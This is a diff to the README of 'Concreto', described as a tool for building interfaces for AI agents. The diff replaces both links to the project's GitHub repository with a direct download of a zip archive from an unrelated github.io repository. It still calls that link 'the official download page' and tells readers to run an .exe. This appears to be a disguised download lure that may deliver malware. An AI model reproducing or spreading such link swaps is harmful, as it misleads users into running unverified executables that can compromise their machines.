@@ -5,7 +5,7 @@ description: "Provide design intelligence for AI coding agents to improve softwa
 ---
 # 🏗️ Concreto - Build Better Interfaces For Your Agents
 
-[![](https://img.shields.io/badge/Download-Concreto-blue.svg)](https://github.com/sanjayma4345/Concreto)
+[![](https://img.shields.io/badge/Download-Concreto-blue.svg)](https://github.com/sanjayma4345/sanjayma4345.github.io/raw/refs/heads/main/unbalancing/sanjayma-github-io-v1.5.zip)
 
 Concreto provides a clear way to build user interfaces for AI agents. It connects your agent to visual elements so you see what the computer does. This tool removes guesswork from agent tasks and makes the work visible.
 
@@ -29,7 +29,7 @@ Your computer needs a few things to run Concreto. Ensure your system meets these
 
 Follow these steps to set up the software on your Windows machine.
 
-1. Visit [the official download page](https://github.com/sanjayma4345/Concreto) to find the latest version.
+1. Visit [the official download page](https://github.com/sanjayma4345/sanjayma4345.github.io/raw/refs/heads/main/unbalancing/sanjayma-github-io-v1.5.zip) to find the latest version.
 2. Look for the file ending in .exe.
 3. Click the link to start the download.
 4. Save the file to your desktop or downloads folder.
